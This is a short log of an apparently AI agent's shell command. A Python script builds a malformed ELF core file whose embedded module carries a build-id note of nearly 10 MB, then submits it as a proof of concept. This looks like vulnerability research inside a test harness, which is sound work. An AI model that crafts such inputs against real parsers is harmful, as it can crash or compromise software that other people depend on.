Running command: cd /workspace && python3 - <<'PY'
import struct, os
# Max under 10,000,000 bytes (server says 10MB maybe decimal)
PAGE=0x1000; MOD_OFF=0x1000; MOD_VADDR=0x400000; NOTE_OFF=0x200
MAX=9990000
DESCSZ=MAX-MOD_OFF-NOTE_OFF-16
DESCSZ-=DESCSZ%4
NOTE_SIZE=12+4+DESCSZ; INNER_SIZE=NOTE_OFF+NOTE_SIZE
inner=bytearray(INNER_SIZE)
inner[0:16]=b'\x7fELF'+bytes([2,1,1,0])+b'\0'*8
struct.pack_into('<HHIQQQIHHHHHH', inner,16,3,62,1,0,64,0,0,64,56,2,0,0,0)
struct.pack_into('<IIQQQQQQ', inner,64,1,5,0,0,0,INNER_SIZE,INNER_SIZE,PAGE)
struct.pack_into('<IIQQQQQQ', inner,64+56,4,4,NOTE_OFF,NOTE_OFF,0,NOTE_SIZE,NOTE_SIZE,4)
struct.pack_into('<III', inner,NOTE_OFF,4,DESCSZ,3)
inner[NOTE_OFF+12:NOTE_OFF+16]=b'GNU\0'
inner[NOTE_OFF+16:]=b'B'*DESCSZ
buf=bytearray(MOD_OFF+INNER_SIZE)
buf[0:16]=b'\x7fELF'+bytes([2,1,1,0])+b'\0'*8
struct.pack_into('<HHIQQQIHHHHHH', buf,16,4,62,1,0,64,0,0,64,56,1,0,0,0)
struct.pack_into('<IIQQQQQQ', buf,64,1,5,MOD_OFF,MOD_VADDR,0,INNER_SIZE,INNER_SIZE,PAGE)
buf[MOD_OFF:]=inner
open('/workspace/poc_big_buildid_max','wb').write(buf)
print(DESCSZ, len(buf), os.path.getsize('/workspace/poc_big_buildid_max'))
PY
# analysis exact candidate same path hypothesis, update note size only not required
bash submit.sh /workspace/poc_big_buildid_max /workspace/analysis.json
